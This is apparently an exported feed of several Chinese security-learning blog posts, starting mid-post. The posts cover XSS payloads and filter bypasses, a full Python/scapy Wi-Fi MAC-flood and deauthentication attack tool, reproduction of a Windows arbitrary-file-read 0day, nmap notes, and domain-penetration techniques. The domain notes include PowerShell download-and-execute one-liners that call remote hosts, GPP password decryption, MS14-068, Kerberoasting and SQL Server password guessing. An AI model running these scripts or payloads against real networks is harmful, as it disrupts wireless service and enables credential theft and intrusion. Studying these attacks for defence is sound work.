&quot;+&quot;&amp;org_fun=&quot;+&quot;&amp;aliastype=&quot;+&quot;&amp;ss=aaa&quot;+&quot;&amp;from=bbb&quot;+&quot;&amp;param=&quot;+&quot;&amp;sp=6fa57ce5b3047ebMTM1NTQwOTA2Mg&quot;+&quot;&amp;r=3ec785174fff5206ed6f0cf4a8c5e3c5&quot;+&quot;&amp;ppp=&quot;+&quot;&amp;secpp=&quot;&lt;/script&gt;    使用\分割语句然后想办法闭合 ：反弹xss一般出现在url拦DOM型xssDOM型的xss就是通过输入，改变了js代码的一部分。dom型xss又分两种：1.可见型DOM xss，输入的东西改变了页面的源码。但是F12查看源码可见类似于：&lt;strong id=&quot;titleshow&quot;&gt;按职业1检索：aaaaaaa &lt;/strong&gt;&lt;/div&gt;&lt;script&gt;if(&quot;aaaaaaa&quot;==&quot;&quot;)document.getElementById(&quot;titleshow&quot;).innerHTML=&quot;按地区检索：全部明星&quot;;if(&quot;职业1&quot;==&quot;职业1&quot;)document.getElementById(&quot;titleshow&quot;).innerHTML=&quot;按职业检索：aaaaaaa&quot;;if(&quot;职业1&quot;==&quot;职业2&quot;)document.getElementById(&quot;titleshow&quot;).innerHTML=&quot;按职业检索：aaaaaaa&quot;;if(&quot;职业1&quot;==&quot;职业3&quot;)document.getElementById(&quot;titleshow&quot;).innerHTML=&quot;按职业检索：aaaaaaa&quot;;&lt;/script&gt;aaaaa为我们输入的，假设现在&lt;,&gt;被过滤了。但是\没被过滤，该如何构造xss呢由于\没有被过滤，使用unicode编码&lt;和&gt;，变为被url解释器解释完后为&lt;a href=&quot;javascript:alert(1)&quot;&gt;&lt;/a&gt;，url中出现了javascript:，指明了后面的语句要当作js执行，所以再次把解释后的字符交给js解释器解释，可以弹窗。当js解释器在标识符名称(例如函数名，属性名等等)中遇到unicode编码会进行解码，并使其标志符照常生效。而在字符串中遇到unicode编码时会进行解码只会被当作字符串。如： &lt;script&gt;\u0061\u006c\u0065\u0072\u0074(1)&lt;/script&gt; unicode编码在标签的属性之中可用，如果在输出使用不会影响上下文 参考文章：https://www.cnblogs.com/iceli/p/8598709.html2.不可见型DOM xss    类似于DVWA里的DOM型xss，只能用调试工具定位。审核源代码是看不见的    记录一些DOM型xss常用的语句：    在iframe中执行js:&lt;iframe onload=&quot;alert(1)&quot;&gt;&lt;/iframe&gt;                               &lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt;                               &lt;iframe src=&quot;vbscript:msbox(1)&quot;&gt;&lt;/iframe&gt; IE执行VBScript代码                               &lt;iframe src=&quot;data:text/html&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt; chrome执行data协议代码                               &lt;iframe src=&quot;data:text/html,&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt; 上面的变体                               &lt;iframe srcdoc=&quot;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt; chrome下的srcdoc属性 总结：在探测一个地方是否有xss的时候，插入好搜索的语句例如：aaaaaa。然后f12源码搜索，分析出现的地方，看看哪里能实现xss。如果有被过滤 了，先试试html转义，注意闭合。当\符号没被过滤的时候可以使用unicode编码来进行代替被过滤的函数或符号 （前提是在script标签里）  存储型xss：        一定要记住本节最开头的话，存储型XSS，输出的位置不一定出现在输入的位置。        7. 因而我们有时候需要逆向的思维，来寻找存储型XSS。 大概思路如下：        7.1 先找到输出点，然后猜测此处输出是否会被过滤。        7.2 如果觉得可能没过滤，我们再找到这个输出是在哪里输入的。        7.3 接着开始测试输入，看输出的效果。        7.4 如果没过滤，那么你就成功了，否则你可以放弃掉它。xss 存储型payload：http://html5sec.org/</code></pre><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>py_wifi_dos</title>
      <link href="/posts/37ff80c8.html"/>
      <url>/posts/37ff80c8.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>距离放寒假还有10天左右，这个星期继续在实验室折腾。突然对mdk3感兴趣，然后逐步了解写出一个脚本。</p><p><b>提醒：本文仅安全研究学习，若是违法被抓作者不负责</b><br><img src="http://pic.netbian.com/uploads/allimg/171111/221348-151040962861e7.jpg" alt="221348-151040962861e7.jpg"></p><h2 id="分析mdk3的攻击"><a href="#分析mdk3的攻击" class="headerlink" title="分析mdk3的攻击"></a>分析mdk3的攻击</h2><p>先开启网卡监听模式</p><pre><code>airmon-ng start &lt;iface&gt;</code></pre><p>首先是<b>Mac洪水攻击</b>：</p><pre><code>mdk3 &lt;iface&gt; a -a &lt;bssid&gt;</code></pre><p>没攻击之前：<br><img src="https://s2.ax1x.com/2019/01/04/FT2zPU.png" alt="FT2zPU.png"></p><p>攻击中<br><img src="https://s2.ax1x.com/2019/01/04/FTRPM9.png" alt="FTRPM9.png"></p><p>wireshark抓到的包:<br><img src="https://s2.ax1x.com/2019/01/04/FTR5e1.md.png" alt="FTR5e1.md.png"></p><p><img src="https://s2.ax1x.com/2019/01/04/FTRLSe.png" alt="FTRLSe.png"></p><p>分析</p><pre><code>Receiver address： 接收地址（Client）Destination address：目的地地址（Client）Transmitter address：发射地址（AP）BSSID：BSSID</code></pre><p>猜想：</p><pre><code>MAC水攻击也就是生成批量的MAC的地址，然后构造请求AP验证的数据包（也就是说只有请求包，不需要构造响应包）</code></pre><p>所以一和二为一样的，接着去scapy找对应的函数。<br><img src="https://s2.ax1x.com/2019/01/04/FTWewq.md.png" alt="FTWewq.md.png"><br><img src="https://s2.ax1x.com/2019/01/04/FTWUk6.md.png" alt="FTWUk6.md.png"></p><p>合三为一查看帮助：<br><img src="https://s2.ax1x.com/2019/01/04/FTW60I.png" alt="FTW60I.png"></p><pre><code>RadioTap()经过对比，发现可以保持默认即可Dot11() 里的addr1填目标MAC地址，这里全部客户端攻击填写：FF:FF:FF:FF:FF:FF或者填指定的MACaddr2和addr3填AP地址Dot11Beacon() 保持默认或自行更改</code></pre><p>MAC洪水攻击代码：</p><pre><code>#coding:utf-8&#39;&#39;&#39;@author:九世@time:2019/1/3&#39;&#39;&#39;from scapy.all import *import threadingn=[]m=[]yser=input(&quot;RMAC:&quot;)def dos(mac):    for k in range(65, 71):        n.append(chr(k))    for q in range(0, 9):        m.append(q)    #批量生成MAC    for v in n:        for l in m:            for k in n:                for w in m:                    for s in n:                        for mq in m:                            for q in n:                                for p in m:                                    for o in n:                                        for g in m:                                            for we in n:                                                for wq in m:                                                    macs = &quot;{}{}:{}{}:{}{}:{}{}:{}{}:{}{}&quot;.format(v, l, k, w, s, mq, q,p, o, g, we, wq)                                                    data=RadioTap()/Dot11(subtype=11,addr1=&quot;ff:ff:ff:ff:ff:ff&quot;,addr2=&quot;{}&quot;.format(macs),addr3=mac,addr4=mac)/Dot11Beacon(timestamp=70180) #构造数据包                                                    sendp(data,iface=&quot;mon0&quot;)if __name__ == &#39;__main__&#39;:    t=threading.Thread(target=dos,args=(&quot;{}&quot;.format(yser),))    t.start()</code></pre><p>攻击效果：<br><img src="https://s2.ax1x.com/2019/01/04/FTWH7q.md.png" alt="FTWH7q.md.png"></p><p><b>Deauch attack攻击</b></p><blockquote><p>Deauch攻击就是伪造AP断开连接的数据包发送给AP还有客户端。造成无法连接到网络</p></blockquote><pre><code>通过刚刚说的话可以获得一个关键信息，我们要构造两个数据包。一个发送给AP一个发送给客户实现欺骗。</code></pre><p>wireshark抓包分析</p><p><img src="https://s2.ax1x.com/2019/01/04/FTf0U0.png" alt="FTf0U0.png"></p><p>欺骗AP<br><img src="https://s2.ax1x.com/2019/01/04/FTfs8U.png" alt="FTfs8U.png"></p><p>那么用到的scapy函数如下：</p><pre><code>RadioTap()/Dot11()/Dot11Deauth()</code></pre><p>demo代码：</p><pre><code>from scapy.all import *#构造一个发送给客户端的包和一个给AP的包while True:    deauth_pkt1 = RadioTap()/Dot11(addr1=&quot;ff:ff:ff:ff:ff:ff&quot;, addr2=&quot;&lt;you MAC&gt;&quot;, addr3=&quot;&lt;you MAC&gt;&quot;) / Dot11Deauth()    deauth_pkt2 = RadioTap()/Dot11(addr1=&quot;&lt;you MAC&gt;&quot;, addr2=&quot;ff:ff:ff:ff:ff:ff&quot;, addr3=&quot;ff:ff:ff:ff:ff:ff&quot;) / Dot11Deauth()    sendp(deauth_pkt1,iface=&quot;mon0&quot;)    sendp(deauth_pkt2,iface=&quot;mon0&quot;)</code></pre><p>测试结果：<br><img src="https://s2.ax1x.com/2019/01/04/FTfjat.md.png" alt="FTfjat.md.png"></p><pre><code>手机也有一个测试但是没有视频很难看出效果，给我师父可以拿代码自行测试</code></pre><h2 id="代码集合体"><a href="#代码集合体" class="headerlink" title="代码集合体"></a>代码集合体</h2><pre><code>由于当事人的能力不足，导致自己处于不利的地位 --《小黑发金木*金木*340号 金木*小白发金木*佐佐木 绯世*黑色死神 金木*独眼之王 金木*天使形态 金木》</code></pre><p>代码：</p><pre><code>&#39;&#39;&#39;@author:jiushi@time:2019/1/4&#39;&#39;&#39;#-*-coding:utf-8-*-from scapy.all import *import optparseimport osbanner=&quot;&quot;&quot;signature:今生今世非你不娶&quot;&quot;&quot;print(banner)print(&#39;[!] Reminder: This tool needs to install the airmon-ng tool.&#39;)print(&#39;&#39;)print(&#39;&#39;)print(&#39;1.Generate a large number of mac addresses for flood attacks&#39;)print(&#39;2.Dot11Deauch attack&#39;)print(&#39;3.SSID and MAC scan&#39;)print(&#39;4.NIC open monitor mode&#39;)print(&#39;&#39;)print(&#39;&#39;)mac_list=[]ssid_list=[]def main():    parser=optparse.OptionParser()    parser.add_option(&#39;-r&#39;,dest=&#39;rmac&#39;,help=&#39;rhost_mac&#39;)    parser.add_option(&#39;-m&#39;,dest=&#39;macaddresses&#39;,help=&#39;mac addresses&#39;,action=&#39;store_true&#39;)    parser.add_option(&#39;-d&#39;,dest=&#39;deauch&#39;,help=&#39;Deauch attack&#39;,action=&#39;store_true&#39;)    parser.add_option(&#39;-s&#39;,dest=&#39;scan&#39;,help=&#39;ssid and macscan&#39;,action=&#39;store_true&#39;)    parser.add_option(&#39;-f&#39;,dest=&#39;iface&#39;,help=&#39;network iface&#39;,action=&#39;store&#39;)    parser.add_option(&#39;-t&#39;,dest=&#39;start&#39;,help=&#39;nic open monitor mode&#39;,action=&#39;store_true&#39;)    (options,args)=parser.parse_args()    if options.macaddresses and options.iface and options.rmac:        ifaces=options.iface        rsmac=options.rmac        mac_addresses(ifaces,rsmac)    elif options.deauch and options.iface and options.rmac:        iface2=options.iface        rs2mac=options.rmac        attack(iface2,rs2mac)    elif options.scan and options.iface:        iface3=options.iface        xj=open(&#39;save.txt&#39;,&#39;w&#39;)        xj.close()        print(&#39;[+] SSID scan:&#39;)        print(&#39;[!] Ctrl+C stop&#39;)        print(&#39;&#39;)        print(&#39;&#39;)        sniff(iface=iface3,prn=scan)    elif options.start and options.iface:        iface0=options.iface        start(iface0)    else:        parser.print_help()        exit()def mac_addresses(iface1,rsmac):    print(&#39;[+] mac_addresses&#39;)    print(&#39;&#39;)    n=[]    m=[]    for k in range(65, 71):        n.append(chr(k))    for q in range(0, 9):        m.append(q)    for v in n:        for l in m:            for k in n:                for w in m:                    for s in n:                        for mq in m:                            for q in n:                                for p in m:                                    for o in n:                                        for g in m:                                            for we in n:                                                for wq in m:                                                    macss = &quot;{}{}:{}{}:{}{}:{}{}:{}{}:{}{}&quot;.format(v, l, k, w, s, mq, q,p, o, g, we, wq)                                                    data=RadioTap()/Dot11(subtype=11,addr1=&quot;ff:ff:ff:ff:ff:ff&quot;,addr2=&quot;{}&quot;.format(macss),addr3=rsmac,addr4=rsmac)/Dot11Beacon(timestamp=70180)                                                    sendp(data,iface=iface1)def attack(iface2,rs2mac):    print(&#39;[+] Dot11Deauth attak&#39;)    print(&#39;&#39;)    while True:        data2=RadioTap()/Dot11(addr1=&quot;ff:ff:ff:ff:ff:ff&quot;,addr2=rs2mac,addr3=rs2mac)/Dot11Deauth()        data3=RadioTap()/Dot11(addr1=rs2mac,addr2=&quot;ff:ff:ff:ff:ff:ff&quot;,addr3=&quot;ff:ff:ff:ff:ff:ff&quot;)/Dot11Deauth()        sendp(data2,iface=iface2)        sendp(data3,iface=iface2)def scan(jianting):    if jianting.haslayer(Dot11Elt):        if jianting.type==0 and jianting.subtype==8:            if not jianting.addr2 in mac_list:                mac_list.append(jianting.addr2)                ssid_list.append(jianting.info)                print(&#39;[+] MAC:{} SSID:{}&#39;.format(jianting.addr2,bytes.decode(jianting.info,encoding=&#39;utf-8&#39;)))                print(&#39;MAC:{} SSID:{}&#39;.format(jianting.addr2,bytes.decode(jianting.info,encoding=&#39;utf-8&#39;)),file=open(&#39;save.txt&#39;,&#39;a&#39;))def start(iface0):    print(&#39;[+] start mon&#39;)    print(&#39;&#39;)    print(&#39;&#39;)    os.system(&#39;sudo airmon-ng start {}&#39;.format(iface0))if __name__ == &#39;__main__&#39;:    main()</code></pre><p>效果测试：<br>SSID扫描</p><p><img src="https://s2.ax1x.com/2019/01/04/FThEaq.png" alt="FThEaq.png"></p><p>MAC洪水攻击<br><img src="https://s2.ax1x.com/2019/01/04/FThMM4.png" alt="FThMM4.png"></p><p>Deauch攻击<br><img src="https://s2.ax1x.com/2019/01/04/FThMM4.png" alt="FThMM4.png"></p><p><img src="https://s2.ax1x.com/2019/01/04/FThYi6.png" alt="FThYi6.png"></p><p>防止mdk3的攻击：有人说只能等协议更新有人说YouTube上防御教程。各位师父自行了解<br>github地址：<a href="https://github.com/422926799/python/tree/master/wifidos" target="_blank" rel="noopener">python/wifidos at master · 422926799/python · GitHub</a></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>当遇到需要分析数据包的时候耐心的对比和分析。去scapy寻找对应的协议函数，进行构造发送。不懂及时搜索。</p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Windows-Low-Privilege-Arbitrary-File Reading</title>
      <link href="/posts/3562c2e4.html"/>
      <url>/posts/3562c2e4.html</url>
      <content type="html"><![CDATA[<h3 id="0x01Readfile-0day介绍"><a href="#0x01Readfile-0day介绍" class="headerlink" title="0x01Readfile 0day介绍"></a>0x01Readfile 0day介绍</h3><p>引用：</p><blockquote><p>该bug在“MsiAdvertise.”中<br>调用此函数将导致安装程序服务复制文件。<br>这将把可以用第一个参数控制的任意文件复制到c:windowsinstaller……在模拟时完成检查，但是使用连接仍然有一个TOCTOU。这意味着我们可以将它复制为SYSTEM的任何文件，并且目标文件总是可读的。这会导致任意文件读取漏洞。<br>繁殖：<br>确保复制readfile.exe和“file”（在文件夹PoC-Files下找到）……并将它们放在同一个目录中。<br>使用：read file.exe targetfile（其中targetfile是要读取的文件，IE：“read file.exe c:userstestdesktopdesktop.ini”）<br>运行在2个内核或更多，这应该在一个内核上工作并做一些修改。既然你也可以按时上锁（不过我很懒）。如果可以的话，您应该能够看到这样的东西：<a href="https://www.youtube.com/watch?v=x4P2H64GI1o" target="_blank" rel="noopener">https://www.youtube.com/watch?v=x4P2H64GI1o</a><br>确认该bug的最简单方法是创建两个本地帐户，并读取另一个帐户的desktop.ini。<br>即使没有枚举向量，这仍然是坏消息，因为许多文档软件，如.，实际上将文件保存在静态位置，其中包含最近打开的文档的完整路径和文件名。因此，通过像这样读取文件，您可以获得其他用户创建的文档的文件名。文件系统是一个蜘蛛网，到处都可以找到对用户创建文件的引用。因此，没有枚举bug并不重要。<br>如果启用了影子副本，您显然可以窃取SAM和System蜂箱，我猜想……<br>也许还有其他的用例。但是我不是很聪明，所以我不知道。</p></blockquote><h3 id="0x02复现过程"><a href="#0x02复现过程" class="headerlink" title="0x02复现过程"></a>0x02复现过程</h3><pre><code>a.创建一个低权限用户b.切换到低权限用户读取notepad c:\users\Administrator\Desktop\desktop.ini发现没有权限读取，使用Readfile里的Readfile.exe执行：Readfile.exe C:\User\Administrator\Desktop\desktop.ini读取成功</code></pre><p><img src="https://s1.ax1x.com/2018/12/22/FyVSPI.png" alt="FyVSPI.png"></p><p>YouTube视频：<a href="https://www.youtube.com/watch?v=x4P2H64GI1o" target="_blank" rel="noopener">https://www.youtube.com/watch?v=x4P2H64GI1o</a><br>复现工具地址：<a href="https://github.com/422926799/note/tree/master/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E4%BB%8E%E4%BD%8E%E6%9D%83%E8%AF%BB%E5%8F%96Administrator%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/%E5%B7%A5%E5%85%B7/Readfile" target="_blank" rel="noopener">note/学习记录/漏洞复现/从低权读取Administrator任意文件/工具/Readfile at master · 422926799/note · GitHub</a></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>nmap-note</title>
      <link href="/posts/c80d7fdf.html"/>
      <url>/posts/c80d7fdf.html</url>
      <content type="html"><![CDATA[<h2 id="0x01前言"><a href="#0x01前言" class="headerlink" title="0x01前言"></a>0x01前言</h2><p>继续读《web安全攻防渗透测试实战指南》，做一下读书笔记。分享一下学习到的东西<br><img src="http://i0.hdslb.com/bfs/archive/31e5a9ad5b4c26aba172443079adc39e9578a397.jpg" alt="31e5a9ad5b4c26aba172443079adc39e9578a397.jpg"></p><h2 id="0x02正文"><a href="#0x02正文" class="headerlink" title="0x02正文"></a>0x02正文</h2><pre><code>-iL 从txt导入目标IP进行扫描 nmap -iL iplist.txt--exclude 后面跟不扫描的IP 例子：nmap -iL iplist.txt --exclude 127.0.0.1--excludefile 从文件中导入不扫描的ip 例子： nmap -iL iplist.txt --excludefile notip.txt-sL 仅列举指定目标IP，不进行主机扫描 例子：nmap -sL 127.0.0.1 192.168.3.39|nmap -iL iplist.txt -sL-sn 只进行主机发现，不进行端口扫描 例子：nmap -sn 192.168.3.39-Pn 将所有指定的主机视为开启，不进行主机发现 例子:nmap -Pn 192.168.3.39-PS/PA/PU/PY 使用TCP/SYN/ACK或SCTP INIT/ECHO 方式来发现 例子：nmap -PS 192.168.3.39|nmap -PA 192.168.3.39|nmap -PU 192.168.3.39|nmap -PY 192.168.3.39-PE/-PP/PM 使用ICMP echo，timestamep,netmask请求包发现主机 例子：nmap -PE 192.168.3.39|nmap -PP 192.168.3.39|nmap -PM 192.168.3.39-PO 使用IP协议包探测对方主机是否开启 例子：nmap -PO 192.168.3.39-n/-R -n表示不进行DNS解析：-R表示总是进行DNS解析 例子：nmap -sV -n 127.0.0.1|nmap -R 127.0.0.1--dns-servers 指定DNS服务器 例子：nmap -R 192.168.3.39 --dns-servers--system-dns 指定使用系统的DNS服务器 例子：nmap -R 192.168.3.39 --system-dns--traceroute 追踪每个路由节点 例子：nmap 192.168.3.34 --traceroute-sS/sT/sA/sW/sM 指定使用：TCP SYN/Connect()/ACK/Window/Maimon scans的方式对目标主机进行扫描-sU 使用UDP方式扫描UDP端口 例子：nmap -sU 192.168.3.39-sN/sF/sX 指定使用TCP Null/FIN/Xmas scans秘密扫描的方式协助探测对方的TCP端口状态--scanflags 定制TCP包flags 例子：nmap -sV 192.168.3.39 --scanflags 1-sI 指定使用Idle scan的方式扫描目标主机 例子：nmap -sI 空闲主机IP -Pn 目标主机IP-sY/sZ 使用SCTP INIT/COOKIE-ECHO扫描SCTP协议端口的开放状态-sO 确定目标主机支持的协议 例子：nmap -sO 192.168.3.39-b 使用FTP bounce scan扫描方式 例子：nmap -b 192.168.3.39-p  指定扫描的端口 例子：nmap -p 3389,445 192.168.3.39-F 快速扫描模式，只扫描TOP100的端口 例子：nmap -F 192.168.3.39-r 不进行端口打乱的操作，让nmap的扫描不轻易的被对方的防火墙检测到 例子：nmap -p 445,135 -r 192.168.3.39更多脚本请参考：https://nmap.org/nsedoc/categories--top-ports 扫描开放概率最高的端口 （Nmap作者曾经做过大规模的扫描，以统计开放概率最高的端口。默认情况下nmap会扫描最有可能的1000个端口） 例子：nmap 192.168.3.39 --top-ports 445--port-raito 扫描指定频率以上的端口-sV 指定nmap进行版本探测 例子：nmap -sV 192.168.3.39--version-intensity 指定版本探测深度(范围:0-9) nmap -sV 192.168.3.39 --version-inensity 9--version-light 指定轻量级侦探方式（intensity 2）--version-all 尝试使用所有的probes进行侦测--version-trace 显示出详细版本侦测过程信息-A 表示全方面扫描 例子：nmap -A 192.168.3.39-T 扫描速度 (范围：1-5) 例子 nmap -A-T5 192.168.3.39-sC 全面收集信息 例子：nmap -sC 192.168.3.39-sP 判断目标是否存活-O 判断目标操作系统-sF 探测目标防火墙状态常用的扫描方式:nmap 192.168.3.39nmap 192.168.3.0/24 扫描网段nmap -A -T5 192.168.3.35nmap -sV -T5 192.168.3.39nmap -sC 192.168.3.39nmap -sS 192.168.3.39nmap -sC -n -sV --version-inensity 9 -T5 192.168.3.39nmap -iL iplist.txt --exclude 127.0.0.1nmap -iL iplist.txt --excludefile notip.txtnmap -p 135,445,3389 192.168.3.39nmap --traceroute 192.168.3.39nmap -O 192.168.3.39nmap -sF 192.168.3.39常见6种nmap端口状态及协议open 开放的filetered 被过滤的，表示端口被防火墙或其他网络设备阻止，不能访问close 关闭的unfiltered 未被过滤的，表示nmap无法确定端口所在状态,需进一步探测open/filetered 开放的或被过滤的，nmap不能识别close/filetered 关闭的或被过滤的，nmap不能识别Nmap进阶：nmap的默认脚本存放在/xx/nmap/scripts的文件夹下nmap的脚本主要分为以下几类Auth 负责处理鉴权处理Broadcast 在局域网内探查更多服务的开启情况，如DHCP/DNS/SQLserverBrute 针对常见的应用提供暴力破解方式，如HTTP/SMTP等Default 针对-sC或-A选项提供默认脚本，提供基本脚本的扫描能力Discovery 对网络进行更多的扫描，如SMB枚举，SNMP查询等Dos 用于进行拒绝服务攻击Exploit 利用已知的漏洞入侵系统External 利用第三方数据库或资源，例如：进行whois解析Fuzzer 模糊测试脚本，发送异常包给目标机，探测潜在漏洞Intrusive 入侵性脚本，此类脚本可能会引起对方的IDS/IPS的记录等Malware 探测目标机是否感染了病毒，开启了后门信息等Safe 此类脚本与Intrusive相反，属于安全脚本Version 负责增强服务与版本扫描功能的脚本Vuln 负责检查目标机是否有常见的漏洞如MS17-010脚本使用方法 例子：nmap --script=auth（脚本名称） IP常用脚本：用户还可以根据配置--script=类别进行扫描，常用参数如下表示-sC/--script=Default 使用默认的脚本进行扫描--script=&lt;Lua scripts&gt; 使用某个脚本进行扫描--script-args=key1=value1,key2=value2 该参数用于传递脚本里的参数，key1是参数名，该参数对应value1这个值。如果还有更多参数逗号连接--script-args-file=filename 使用文件为脚本提供参数--script-trace 如果设置参数，则显示脚本执行过程中发送与接收数据--script-updatedb 在nmap的scripts目录中有一个script.db文件，该文件保存了当前nmap可用的脚本,类似于一个小型的数据库，如果我们开启nmap并调用了此参数，就会进行脚本更新--script-help 输出对应脚本的使用参数，以及详细的介绍信息 用法：nmap --script-help auth</code></pre><p>笔记：<a href="https://github.com/422926799/note" target="_blank" rel="noopener">GitHub - 422926799/note</a><br>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>细读域渗透文章得到的总结</title>
      <link href="/posts/9824134d.html"/>
      <url>/posts/9824134d.html</url>
      <content type="html"><![CDATA[<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>昨天看到一篇不错的域渗透文章。想理解里面的内容，然后耗费的时间有点多，不过收获还是很多的起码了解了域渗透该咋弄，怎么维持权限等等之类。由于时间不够无法搭建好环境进行域渗透学习（下午上学）。先写个目前总结的，等下个星期或者在学校搭建好环境在写一篇。<br><img src="https://wx3.sinaimg.cn/wap720/0064U3Yugy1fre4xtbm06j31be0qotcv.jpg" alt="0064U3Yugy1fre4xtbm06j31be0qotcv.jpg"></p><h2 id="0x01正文"><a href="#0x01正文" class="headerlink" title="0x01正文"></a>0x01正文</h2><p>1.首先要知道那台是域控</p><pre><code>1.查看自己的DNS地址2.扫描端口开了389的那台就是</code></pre><p>2.使用powershell进行信息收集</p><pre><code>https://github.com/cheetz/PowerTools 用于域信息收集的项目1.先将这个项目下载到vps或本地通过ngrok映射到公网2.打开powershell执行：IEX (New.ObjectNet.WebClient).DownloadString(&#39;http://IP地址/powerview.ps1&#39;);Get-HostIP    Get-HostIP                      -   resolves a hostname to an IP    Check-Write                     -   checks if the current user can write to the specified file    Set-MacAttribute                -   Sets MAC attributes for a file based on another file or input (from Powersploit)    Invoke-CopyFile                 -   copies a local file to a remote location, matching MAC properties    Test-Server                     -   tests connectivity to a specified server    Get-UserProperties              -   returns all properties specified for users, or a set of user:prop names    Get-ComputerProperties          -   returns all properties specified for computers, or a set of computer:prop names    Get-LastLoggedOn                -   return the last logged on user for a target host    Get-UserLogonEvents             -   returns logon events from the event log for a specified host    Get-UserTGTEvents               -   returns TGT request events for a specified host    Invoke-CheckLocalAdminAccess    -   check if the current user context has local administrator access                                        to a specified host    Invoke-SearchFiles              -   search a local or remote path for files with specific terms in the name    Convert-NameToSid               -   converts a user/group name to a security identifier (SID)    Convert-SidToName               -   converts a security identifier (SID) to a group/user name    详细使用：https://github.com/cheetz/PowerTools/tree/master/PowerView</code></pre><p>3.SYSVOL GPP漏洞</p><pre><code>SYSVOL是指存储公共服务器副本的共享文件夹，它们在域中所有的域控制器之间复制.Sysvol文件夹是安装AD时创建的，它用来存放GPO，脚本等信息。同时，存放Sysvol文件文件夹中的信息，会复制到域中所有DC上。域服务器一般都会共享这个文件夹，或者搜索当前机器下的XML文件将包含凭据：groups.xml，scheduledtasks.xml，services.xml中，datasources.xml映射驱动（Drives.xml）数据源（DataSources.xml）打印机配置（Printers.xml）创建/更新服务（services.xml中）计划任务（ScheduledTasks.xml）由于经过身份验证的用户（任何域用户或受信任域中的用户）具有对SYSVOL的读取权限\192.168.50.205sysvolpentest.comPolicies{84017B64-2662-4BA3-A06C-FB953CCBE92D}UserPreferencesGroups.xml经过AES-256位加密cpassword=&quot;fUCMHAw9I2PdYRZEBMS54IvtPHX3ni44qRkWtfBtxoA&quot;可以使用AES私钥解密GPP密码微软在MSDN上发布了AES加密密钥（共享密钥）https://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be.aspx使用PowerShell的脚本解密https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1寻找SYSVOL里的密码和攻击GPP（组策略偏好注：当创建了一个域用户后，将其添加到验证组策略对象。在SYSVOL的xml文件会有用户的配置文件http://www.91ri.org/14909.html防SYSVOL更新配置文件：防：*在用于管理GPO的计算机上安装KB2962486，以防止将新凭据置于组策略首选项中。*设置每个人访问权限*不在组策略中使用域控密码*设置共享文件夹SYSVOL的访问权限*删除现有的GPP里包含密码的XML文件。</code></pre><p>4.MS14-068攻击</p><pre><code>需要条件：域用户及其口令域用户对应sid域控地址 Win7及以上系统Tips：1. 操作系统要求Win7及以上，这是因为XP不支持导入Ticket2. 攻击主机可使用其他域用户信息，比如可以在主机A上用域用户B的口令及sid攻击3. 将Python脚本转成exe即可在任意一台Windows主机使用注意事项：Tips：1. 如果不先清除内存中的Ticket直接导入，有可能会失败2. 连接域控要使用域控地址，不要用IP利用方法：https://www.cnblogs.com/backlion/p/6820744.html?utm_source=itdadao&amp;utm_medium=referralMS14-068过程：1.请求没有PAC的Kerberos TGT认证票据作为标准用户，DC回复TGT2.生成一个伪造的PAC，没有密钥，所以生成的PAC使用域用户的密码数据用MD5算法而不是HMAC_MD5“签名”。3.作为TGS服务票据请求的一部分，使用伪造的PAC作为授权数据发送无PAC的TGT到DC。4.DC似乎被这个混淆了，所以它放弃了用户发送的不含PAC的TGT，创建一个新的TGT，并将伪造的PAC插入到它自己的授权数据中，并将这个TGT发送给用户。5.这个伪造PAC的TGT使得用户可以成为易受攻击的DC上的域管理员。防御：安装检查KB3011780的安装</code></pre><p>5.SPN扫描</p><pre><code>Kerberoast可以作为一个有效的方法从Active Directory中以普通用户的身份提取服务帐户凭据，无需向目标系统发送任何数据包SPN是服务在使用Kerberos身份验证的网络上的唯一标识符。它由服务类，主机名和端口组成。在使用Kerberos身份验证的网络中，必须在内置计算机帐户（如NetworkService或LocalSystem）或用户帐户下为服务器注册SPN。对于内置帐户，SPN将自动进行注册。但是，如果在域用户帐户下运行服务，则必须为要使用的帐户手动注册SPN。SPN扫描的主要好处是，SPN扫描不需要连接到网络上的每个IP来检查服务端口，SPN通过LDAP查询向域控执行服务发现，SPN查询是Kerberos的票据行为一部分，因此比较难检测SPN扫描。powershell -exec bypass -Command &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/PyroTek3/PowerShell-AD-Recon/master/Discover-PSMSSQLServers&#39;); Discover-PSMSSQLServers&quot;</code></pre><p>6.扫描SQL Server</p><pre><code>*脚本地址：https://github.com/nullbind/Powershellery/tree/master/Stable-ish/MSSQL*用法：Import-Module .Get-SQLServerAccess.psm1或者放到VPS用下载并执行的方式来执行脚本*弱口令猜解：Get-SQLServerAccess -sqluser sa -sqlpass 123qwe!@#*寻找敏感数据：Get-SQLServerAccess -query &quot;select name as &#39;Databases&#39; from master..sysdatabases where HAS_DBACCESS(name) = 1&quot;非扫描式的SQL Server发现https://blog.netspi.com/locate-and-attack-domain-sql-servers-without-scanning</code></pre><p>7.票据</p><p><img src="https://image.3001.net/images/20141002/14122235056423.jpg!small" 